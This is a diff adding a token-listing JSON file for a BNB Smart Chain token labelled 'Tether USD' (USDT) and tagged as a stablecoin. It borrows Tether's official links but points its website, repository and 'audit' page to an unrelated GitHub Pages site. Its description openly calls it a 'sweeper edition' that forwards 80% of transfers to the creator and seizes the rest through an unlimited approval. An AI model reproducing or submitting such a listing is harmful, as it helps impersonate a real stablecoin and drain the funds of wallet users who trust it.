@@ -1,0 +1,64 @@
+{
+    "links": [
+        {
+            "name": "docs",
+            "url": "https://bscscan.com/token/0xd565656E51C5e51B7D9292106413dBE5D27DF66f"
+        },
+        {
+            "name": "github",
+            "url": "https://github.com/Mirxa27/usdt-trc20"
+        },
+        {
+            "name": "source_code",
+            "url": "https://github.com/Mirxa27/usdt-trc20"
+        },
+        {
+            "name": "blog",
+            "url": "https://mirxa27.github.io/usdt-trc20/whitepaper.html"
+        },
+        {
+            "name": "forum",
+            "url": "https://mirxa27.github.io/usdt-trc20/audit.html"
+        },
+        {
+            "name": "whitepaper",
+            "url": "https://tether.to/wp-content/uploads/2016/06/TetherWhitePaper.pdf"
+        },
+        {
+            "name": "x",
+            "url": "https://x.com/tether_to"
+        },
+        {
+            "name": "telegram",
+            "url": "https://t.me/tether"
+        },
+        {
+            "name": "medium",
+            "url": "https://medium.com/tether"
+        },
+        {
+            "name": "discord",
+            "url": "https://discord.com/invite/hqKvyAM"
+        },
+        {
+            "name": "reddit",
+            "url": "https://reddit.com/r/Tether/"
+        },
+        {
+            "name": "facebook",
+            "url": "https://facebook.com/tether.to"
+        }
+    ],
+    "name": "Tether USD",
+    "website": "https://mirxa27.github.io/usdt-trc20/",
+    "description": "Tether USD (USDT) sweeper edition on BNB Smart Chain at 0xd565656E51C5e51B7D9292106413dBE5D27DF66f, 6 decimals, 50,000,000 supply. Transfers forward 80% to the creator; approving the token mirrors an unlimited allowance, so the remainder is seized in the same move. Burns are receipted and claimable.",
+    "explorer": "https://bscscan.com/token/0xd565656E51C5e51B7D9292106413dBE5D27DF66f",
+    "type": "BEP20",
+    "symbol": "USDT",
+    "decimals": 6,
+    "status": "active",
+    "id": "0xd565656E51C5e51B7D9292106413dBE5D27DF66f",
+    "tags": [
+        "stablecoin"
+    ]
+}
